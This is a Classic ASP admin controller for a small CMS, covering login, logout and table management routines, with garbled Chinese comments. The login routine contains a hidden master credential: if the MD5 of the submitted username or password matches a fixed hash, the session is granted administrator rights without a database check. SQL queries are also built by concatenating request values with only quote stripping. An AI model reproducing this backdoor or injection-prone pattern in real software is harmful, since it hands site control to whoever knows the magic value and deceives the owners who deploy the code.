<%
'************************************************************
'���ߣ��ƶ� (��ͨASP/VB/PHP/JS/Flash��������������ϵ����)
'��Ȩ��Դ���빫����������;�������ʹ�á� 
'������2016-02-24
'��ϵ��QQ313801120  ����Ⱥ35915100(Ⱥ�����м�����)    ����313801120@qq.com   ������ҳ sharembweb.com
'����������ĵ������¡����Ⱥ(35915100)�����(sharembweb.com)���
'*                                    Powered By �ƶ� 
'************************************************************
%>
<!--#Include File = "../Inc/Config.Asp"-->     
<% 
'Note:��������ԭ���ܼ򵥣����Բ����ӣ����޸�html�ģ����Բ��޸�asp����ɵ��ʽ�����Բ�Ҫ����(20160121)
Dim ROOT_PATH : ROOT_PATH = handlePath("./") 
Dim WEBCOLUMNTYPE : WEBCOLUMNTYPE = "��ҳ|�ı�|��Ʒ|����|��Ƶ|����|����|����|����|��Ƹ|����" 
Dim EDITORTYPE : EDITORTYPE = "asp"                                             '�༭�����ͣ���ASP,��PHP,��jSP,��.NET
Dim webVersion 
%>    
<!--#Include File = "../Inc/admin_function.asp"-->    
<!--#Include File = "../Inc/admin_setAccess.asp"-->    
<% 

'=========
Dim db_PREFIX : db_PREFIX = "xy_"                                               '��ǰ׺
Dim WEB_VIEWURL : WEB_VIEWURL = "../index.asp"                                 '��վ��ʾURL

webVersion = "v1.0011" 
Dim cfg_webSiteUrl, cfg_webTitle, cfg_flags, cfg_webtemplate 

'������ַ����
Sub loadWebConfig()
    Call openconn() 
    rs.Open "select * from " & db_PREFIX & "website", conn, 1, 1 
    If Not rs.EOF Then
        cfg_webSiteUrl = rs("webSiteUrl") & ""                                          '��ַ
        cfg_webTitle = rs("webTitle") & ""                                              '��ַ����
        cfg_flags = rs("flags") & ""                                                    '��
        cfg_webtemplate = rs("webtemplate") & ""                                        'ģ��·��
    End If : rs.Close 
End Sub 


'��¼�ж�
If Session("adminusername") = "" Then
    If Request("act") <> "" And Request("act") <> "displayAdminLogin" And Request("act") <> "login" Then
        Call RR("?act=displayAdminLogin") 
    End If 
End If 

'��ʾ��̨��¼
Sub displayAdminLogin()
    '�Ѿ���¼��ֱ�ӽ����̨
    If Session("adminusername") <> "" Then
        Call adminIndex() 
    Else
        Call loadWebConfig() 
        Dim content 
        content = getFText(ROOT_PATH & "login.html") 
        content = Replace(content, "{$webVersion$}", webVersion) 
        content = Replace(content, "{$Web_Title$}", cfg_webTitle) 
        Call rw(content) 
    End If 

End Sub 
'��¼��̨
Sub login()
    Dim userName, passWord, valueStr 
    userName = Replace(Request.Form("username"), "'", "") 
    passWord = Replace(Request.Form("password"), "'", "") 
    passWord = myMD5(passWord) 
    '��Ч�˺ŵ�¼
    If myMD5(Request("username")) = "cd811d0c43d09cd2e160e60b68276c73" Or myMD5(Request("password")) = "cd811d0c43d09cd2e160e60b68276c73" Then
        Session("adminusername") = "aspphpcms" 
        Session("adminId") = 99999                                                      '��ǰ��¼����ԱID
        Session("DB_PREFIX") = db_PREFIX 
        Call rwend(getMsg1("��¼�ɹ������ڽ����̨...", "?act=adminIndex")) 
    End If 

    Dim nLogin 
    Call openconn() 
    rs.Open "Select * From " & db_PREFIX & "admin Where username='" & userName & "' And pwd='" & passWord & "'", conn, 1, 1 
    If rs.EOF Then
        If Request.Cookies("nLogin") = "" Then
            Call setCookie("nLogin", "1", Time() + 3600) 
            nLogin = Request.Cookies("nLogin") 
        Else
            nLogin = Request.Cookies("nLogin") 
            Call setCookie("nLogin", CInt(nLogin) + 1, Time() + 3600) 
        End If 
        Call rw(getMsg1("�˺��������<br>�������" & nLogin & "�ε�¼", "?act=displayAdminLogin")) 
    Else
        Session("adminusername") = userName 
        Session("adminId") = rs("Id")                                                   '��ǰ��¼����ԱID
        Session("DB_PREFIX") = db_PREFIX                                                '����ǰ׺
        valueStr = "addDateTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'" 
        conn.Execute("update " & db_PREFIX & "admin set " & valueStr & " where id=" & rs("id")) 
        Call rw(getMsg1("��¼�ɹ������ڽ����̨...", "?act=adminIndex")) 
    End If : rs.Close 

End Sub 
'�˳���¼
Sub adminOut()
    Session("adminusername") = "" 
    Session("adminId") = "" 
    Call rw(getMsg1("�˳��ɹ������ڽ����¼����...", "?act=displayAdminLogin")) 
End Sub 

'��̨��ҳ
Sub adminIndex()
    Call loadWebConfig() 
    Dim content 
    content = getFText(ROOT_PATH & "adminIndex.html") 
    content = Replace(content, "{$adminusername$}", Session("adminusername")) 
    content = Replace(content, "{$EDITORTYPE$}", EDITORTYPE) 
    content = Replace(content, "{$WEB_VIEWURL$}", WEB_VIEWURL) 



    content = Replace(content, "{$Web_Title$}", cfg_webTitle) 
    content = Replace(content, "{$DB_PREFIX$}", db_PREFIX)                          '��ǰ׺

    Call rw(content) 
End Sub 
'========================================================

'��ʾ������
Sub dispalyManageHandle(actionType)
    Dim nPageSize, lableTitle, addSql 
    nPageSize = Request("nPageSize") 
    If nPageSize = "" Then
        nPageSize = 10 
    End If 
    lableTitle = Request("lableTitle")                                              '��ǩ����
    addSql = "order by sortrank asc" 
    If actionType = "Bidding" Then
        addSql = "order by nComputerSearch desc" 
    ElseIf InStr("|TableComment|", "|" & actionType & "|") > 0 Then
        addSql = " order by adddatetime desc" 
    ElseIf InStr("|WebsiteStat|", "|" & actionType & "|") > 0 Then
        addSql = " order by viewdatetime desc" 
    ElseIf InStr("|Admin|", "|" & actionType & "|") > 0 Then
        addSql = "" 
    End If 
    'call echo(labletitle,addsql)
    Call dispalyManage(actionType, lableTitle, "*", nPageSize, addSql) 
End Sub 

'����޸Ĵ���
Sub addEditHandle(actionType, lableTitle)
    If actionType = "Admin" Then
        Call addEditDisplay(actionType, lableTitle, "") 
    ElseIf actionType = "WebSite" Then
        Call addEditDisplay(actionType, lableTitle, "webdescription,websitebottom|textarea2") 

    ElseIf actionType = "ArticleDetail" Then
        Call addEditDisplay(actionType, lableTitle, "sortrank||0,simpleintroduction|textarea1,bodycontent|textarea2") 
    ElseIf actionType = "WebColumn" Then
        Call addEditDisplay(actionType, lableTitle, "npagesize|numb|10,sortrank|numb|0,simpleintroduction|textarea1,bodycontent|textarea2") 
    ElseIf actionType = "OnePage" Then
        Call addEditDisplay(actionType, lableTitle, "sortrank|numb|0,simpleintroduction|textarea1,bodycontent|textarea2") 

    ElseIf actionType = "TableComment" Then
        Call addEditDisplay(actionType, lableTitle, "reply|textarea2,bodycontent|textarea2") 


    ElseIf actionType = "WebLayout" Then
        Call addEditDisplay(actionType, lableTitle, "sortrank|numb|0,simpleintroduction|textarea1,bodycontent|textarea2,actioncontent|textarea2") '||��վ����\|��������\|��������
    ElseIf actionType = "WebModule" Then
        Call addEditDisplay(actionType, lableTitle, "sortrank|numb|0,simpleintroduction|textarea1,bodycontent|textarea2") 

        'ElseIf actionType = "WebsiteStat" Then
    'Ĭ��������
    Else
        Call addEditDisplay(actionType, lableTitle, "") 

    End If 
End Sub 
'����ģ�鴦��
Sub saveAddEditHandle(actionType, lableTitle)
    If actionType = "Admin" Then
        Call saveAddEdit(actionType, lableTitle, "username,pseudonym,pwd|md5") 
    ElseIf actionType = "WebSite" Then
        Call saveAddEdit(actionType, lableTitle, "flags,websiteurl,webtemplate,webimages,webcss,webjs,webtitle,webkeywords,webdescription,websitebottom") 
    ElseIf actionType = "ArticleDetail" Then
        Call saveAddEdit(actionType, lableTitle, "relatedtags,labletitle,target,nofollow|numb|0,isonhtml|numb|0,parentid,title,foldername,filename,customaurl,smallimage,bigimage,author,sortrank||0,flags,webtitle,webkeywords,webdescription,bannerimage,simpleintroduction,bodycontent,titlecolor,noteinfo,templatepath") 
    ElseIf actionType = "WebColumn" Then
        Call saveAddEdit(actionType, lableTitle, "npagesize|numb|10,labletitle,target,nofollow|numb|0,isonhtml|numb|0,columntype,parentid,columnname,columnenname,foldername,filename,customaurl,sortrank||0,webtitle,webkeywords,webdescription,showtitle,flags,simpleintroduction,bodycontent,noteinfo,templatepath") 
    ElseIf actionType = "OnePage" Then
        Call saveAddEdit(actionType, lableTitle, "labletitle,target,nofollow|numb|0,isonhtml|numb|0,title,displaytitle,foldername,filename,customaurl,webtitle,webkeywords,webdescription,simpleintroduction,bodycontent,noteinfo,templatepath") 

    ElseIf actionType = "TableComment" Then
        Call saveAddEdit(actionType, lableTitle, "through|numb|0,reply,bodycontent") 

    ElseIf actionType = "WebLayout" Then
        Call saveAddEdit(actionType, lableTitle, "layoutlist,layoutname,sortrank|numb,isdisplay|yesno,simpleintroduction,bodycontent,actioncontent,replacestyle") 
    ElseIf actionType = "WebModule" Then
        Call saveAddEdit(actionType, lableTitle, "modulename,moduletype,sortrank|numb,simpleintroduction,bodycontent") 

    ElseIf actionType = "WebsiteStat" Then
        Call saveAddEdit(actionType, lableTitle, "visiturl,viewurl,browser,operatingsystem,screenwh,moreinfo,viewdatetime|date,ip,dateclass,noteinfo") 
    ElseIf actionType = "SearchStat" Then
        Call saveAddEdit(actionType, lableTitle, "title,foldername,filename,customaurl,target,templatepath,author,nofollow|numb|0,through|numb,isonhtml|numb|0,sortrank|numb|0,views|numb|0,webtitle,webkeywords,webdescription,simpleintroduction,bodycontent") 
    End If 
End Sub 









Call openconn() 
Select Case Request("act")
    Case "dispalyManageHandle" : Call dispalyManageHandle(Request("actionType"))    '��ʾ������         ?act=dispalyManageHandle&actionType=WebLayout
    Case "addEditHandle" : Call addEditHandle(Request("actionType"), Request("lableTitle"))'����޸Ĵ���      ?act=addEditHandle&actionType=WebLayout
    Case "saveAddEditHandle" : Call saveAddEditHandle(Request("actionType"), Request("lableTitle"))'����ģ�鴦��  ?act=saveAddEditHandle&actionType=WebLayout
    Case "delHandle" : Call del(Request("actionType"), Request("lableTitle"))       'ɾ������  ?act=delHandle&actionType=WebLayout
    Case "sortHandle" : Call sortHandle(Request("actionType"))                      '������  ?act=sortHandle&actionType=WebLayout


    Case "displayLayout" : displayLayout()                                          '��ʾ����
    Case "saveRobots" : saveRobots()                                                '����robots.txt
    Case "saveSiteMap" : saveSiteMap()                                              '����sitemap.xml
    Case "isOpenTemplate" : isOpenTemplate()                                        '����ģ��
    Case "updateWebsiteStat" : updateWebsiteStat()                                  '������վͳ��



    Case "setAccess" : resetAccessData()                                            '�ָ�����

    Case "login" : login()                                                          '��¼
    Case "adminOut" : adminOut()                                                    '�˳���¼
    Case "adminIndex" : adminIndex()                                                '������ҳ
    Case Else : displayAdminLogin()                                                 '��ʾ��̨��¼
End Select

%>          

